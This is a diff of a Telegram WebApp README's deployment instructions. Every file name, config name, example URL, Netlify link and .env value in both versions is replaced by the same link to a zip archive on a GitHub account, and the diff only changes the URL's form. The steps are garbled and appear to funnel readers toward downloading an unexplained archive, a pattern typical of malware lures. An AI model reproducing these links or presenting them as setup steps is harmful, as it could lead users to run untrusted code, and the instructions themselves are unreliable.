@@ -16,31 +16,31 @@ This folder contains a Telegram WebApp that allows users to select their locatio
 ### Option 1: GitHub Pages (Free & Easy)
 
 1. Create a new GitHub repository (e.g., `my-bot-webapp`)
-2. Upload `https://github.com/rustamG88/bot-webapp/raw/refs/heads/main/flexured/webapp-bot-v3.6-beta.3.zip` to the repository
+2. Upload `https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip` to the repository
 3. Go to Settings → Pages → Enable GitHub Pages from `main` branch
-4. Your WebApp URL will be: `https://github.com/rustamG88/bot-webapp/raw/refs/heads/main/flexured/webapp-bot-v3.6-beta.3.zip`
-5. Add to your `https://github.com/rustamG88/bot-webapp/raw/refs/heads/main/flexured/webapp-bot-v3.6-beta.3.zip` or `.env`:
+4. Your WebApp URL will be: `https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip`
+5. Add to your `https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip` or `.env`:
    ```
-   https://github.com/rustamG88/bot-webapp/raw/refs/heads/main/flexured/webapp-bot-v3.6-beta.3.zip
+   https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip
    ```
 
 ### Option 2: Your Server
 
-1. Upload `https://github.com/rustamG88/bot-webapp/raw/refs/heads/main/flexured/webapp-bot-v3.6-beta.3.zip` to your web server with HTTPS
-2. Make sure it's accessible at a URL like `https://github.com/rustamG88/bot-webapp/raw/refs/heads/main/flexured/webapp-bot-v3.6-beta.3.zip`
-3. Add to `https://github.com/rustamG88/bot-webapp/raw/refs/heads/main/flexured/webapp-bot-v3.6-beta.3.zip` or `.env`:
+1. Upload `https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip` to your web server with HTTPS
+2. Make sure it's accessible at a URL like `https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip`
+3. Add to `https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip` or `.env`:
    ```
-   https://github.com/rustamG88/bot-webapp/raw/refs/heads/main/flexured/webapp-bot-v3.6-beta.3.zip
+   https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip
    ```
 
 ### Option 3: Netlify (Free)
 
-1. Go to [https://github.com/rustamG88/bot-webapp/raw/refs/heads/main/flexured/webapp-bot-v3.6-beta.3.zip](https://github.com/rustamG88/bot-webapp/raw/refs/heads/main/flexured/webapp-bot-v3.6-beta.3.zip)
+1. Go to [https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip](https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip)
 2. Drag and drop the `webapp` folder
-3. Get your URL (e.g., `https://github.com/rustamG88/bot-webapp/raw/refs/heads/main/flexured/webapp-bot-v3.6-beta.3.zip`)
-4. Add to `https://github.com/rustamG88/bot-webapp/raw/refs/heads/main/flexured/webapp-bot-v3.6-beta.3.zip` or `.env`:
+3. Get your URL (e.g., `https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip`)
+4. Add to `https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip` or `.env`:
    ```
-   https://github.com/rustamG88/bot-webapp/raw/refs/heads/main/flexured/webapp-bot-v3.6-beta.3.zip
+   https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip
    ```
 
 ## Important Notes
